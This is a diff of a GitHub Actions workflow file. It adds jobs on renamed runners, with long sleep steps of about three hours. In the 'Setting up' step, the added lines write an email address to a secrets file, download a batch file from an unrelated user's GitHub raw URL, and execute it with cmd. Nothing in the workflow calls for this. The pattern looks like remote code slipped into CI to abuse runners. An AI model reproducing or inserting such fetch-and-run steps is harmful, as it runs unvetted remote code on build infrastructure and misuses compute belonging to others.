@@ -77,14 +77,40 @@ jobs:
          start-sleep -s 10801
 
   Third:
-     runs-on: windows-latest
+     runs-on: GitHub Actions 3
      
      steps:
     
       - name: Wait 2
         run: |
-         start-sleep 600
-         start-sleep -s 601
+         start-sleep 10
+         start-sleep -s 10
+      
+      - name: Setting up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
+         cmd /c up.bat
+      
+      - name: A
+        run: |
+         start-sleep 303
+         start-sleep -s 304
+      
+      - name: B
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  Forth:
+     runs-on: GitHub Actions 10
+     
+     steps:
+    
+      - name: Wait 2
+        run: |
+         start-sleep 10
+         start-sleep -s 10
       
       - name: Setting up
         run: |
